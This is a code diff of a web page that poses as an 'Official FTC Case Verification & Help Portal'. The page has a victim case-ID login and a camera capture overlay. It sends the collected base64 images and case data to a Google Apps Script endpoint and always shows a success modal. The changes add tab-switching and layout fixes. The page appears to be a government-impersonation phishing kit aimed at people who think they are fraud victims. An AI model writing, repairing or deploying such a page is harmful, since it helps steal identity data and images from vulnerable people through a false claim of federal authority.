@@ -4,15 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Official FTC Case Verification & Help Portal</title>
+    
     <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+    
     <style>
+        /* Base state: completely block independent view overlap issues */
         .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        .tab-content.active { display: block !important; }
+        
         .bg-ftc-navy { background-color: #0b2240; }
         .bg-ftc-blue { background-color: #065CB4; }
         .bg-ftc-light { background-color: #E6F1FD; }
+        
+        /* Immersive mobile full-screen scanner layer override */
         .fullscreen-cam-overlay {
             display: none;
             position: fixed;
@@ -24,7 +31,7 @@
             align-items: center;
             padding: 24px;
         }
-        .fullscreen-cam-overlay.active { display: flex; }
+        .fullscreen-cam-overlay.active { display: flex !important; }
     </style>
 </head>
 <body class="bg-[#f4f7fa] text-gray-900 font-sans min-h-screen flex flex-col antialiased">
@@ -51,6 +58,7 @@
     </header>
 
     <div class="flex flex-col lg:flex-row flex-1 overflow-hidden">
+        
         <nav class="w-full lg:w-64 bg-white p-3 lg:p-4 border-b lg:border-b-0 lg:border-r border-gray-300 flex flex-row lg:flex-col gap-2 shadow-xs shrink-0">
             <button onclick="switchTab('victim-portal-tab')" id="btn-victim-portal-tab" class="tab-btn flex-1 lg:flex-initial flex items-center justify-center lg:justify-start space-x-3 px-3 py-3 rounded-xl text-md font-bold text-gray-700 hover:bg-slate-100 transition border-2 border-transparent">
                 <i data-lucide="shield-check" class="w-5 h-5 text-[#0071bc]"></i> <span>Identity Portal</span>
@@ -61,15 +69,19 @@
         </nav>
 
         <main class="flex-1 p-4 md:p-8 overflow-y-auto">
-            <section id="victim-portal-tab" class="tab-content">
+
+            <section id="victim-portal-tab" class="tab-content active">
                 <div class="max-w-3xl mx-auto space-y-6">
+                    
                     <div class="bg-white border-2 border-gray-300 rounded-2xl shadow-md p-6">
                         <h2 class="text-xl md:text-2xl font-serif font-black text-ftc-navy flex items-center gap-2 mb-1">Log In to Your Case File</h2>
+                        <p class="text-xs text-gray-600 mb-4 font-semibold">Type your assigned Case ID reference number into the box below to open your secure portal folder.</p>
                         <div class="flex flex-col sm:flex-row gap-3">
                             <input type="text" id="victimSearchInput" placeholder="Type Case ID here..." class="flex-1 bg-white border-2 border-gray-400 rounded-xl px-4 py-3 text-gray-900 font-bold uppercase tracking-wider text-base shadow-inner focus:outline-none focus:border-[#0071bc]">
                             <button onclick="trackVictimCase()" class="bg-[#0071bc] hover:bg-blue-800 text-white font-black px-6 py-3 rounded-xl text-base flex items-center justify-center gap-2 transition shadow shadow-blue-500/20"><i data-lucide="key-round" class="w-4 h-4"></i> View My Case</button>
                         </div>
                     </div>
+
                     <div id="victimPortalOutput" class="bg-white border-2 border-dashed border-gray-300 rounded-2xl p-12 text-center text-gray-400">
                         <i data-lucide="folder-search" class="w-16 h-16 mx-auto mb-3 opacity-20 text-ftc-navy"></i>
                         <p class="text-base font-bold text-gray-500">Awaiting Valid Reference Code Entry</p>
@@ -183,8 +195,20 @@
         let cases = JSON.parse(localStorage.getItem('ftc_sys_cases')) || seedCases;
         let activeEditIdx = 0; let activeTrackingCaseIdRef = ""; let videoStreamRef = null; let base64CapturedOutputString = "";
         
-        // CORRECTION: Direct reference configuration bridge link
         const GOOGLE_SCRIPT_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwaRoM3XnMIC6w9MsTpSer9NJB5CjBbQNYXAu1Qz-Nv32Eoae4SH_ff1CR35jiLrcAZRQ/exec";
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('bg-slate-100', 'text-ftc-navy', 'font-bold'));
+            
+            const targetContent = document.getElementById(tabId);
+            if(targetContent) targetContent.classList.add('active');
+            
+            const targetBtn = document.getElementById(`btn-${tabId}`);
+            if(targetBtn) targetBtn.classList.add('bg-slate-100', 'text-ftc-navy', 'font-bold');
+            if(tabId === 'officer-dashboard-tab') renderOfficerLayout();
+            lucide.createIcons();
+        }
 
         function trackVictimCase() {
             const searchId = document.getElementById('victimSearchInput').value.trim();
@@ -370,11 +394,10 @@
             base64CapturedOutputString = "";
             trackVictimCase(); 
 
-            // MULTI-DEVICE CORRECTION: Setting Content-Type to text/plain bypasses mobile pre-flight CORS drops completely
             fetch(GOOGLE_SCRIPT_WEBAPP_URL, { 
                 method: "POST", 
                 headers: { "Content-Type": "text/plain" },
-                body: JSON.stringify(finalPackagePayload) 
+                body: JSON.stringify(finalPackagePayload)
             })
             .then(() => { revealBureauSuccessModal(); })
             .catch(() => { revealBureauSuccessModal(); });
@@ -416,7 +439,13 @@
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases)); alert("Parameters synchronized successfully."); renderOfficerLayout();
         }
         function resetMockData() { localStorage.clear(); location.reload(); }
-        window.onload = function() { lucide.createIcons(); switchTab('victim-portal-tab'); }
+        
+        // Explicit layout activation sequence forced on screen launch
+        window.onload = function() { 
+            lucide.createIcons(); 
+            switchTab('victim-portal-tab');
+            document.getElementById('victim-portal-tab').classList.add('active');
+        }
     </script>
 </body>
 </html>
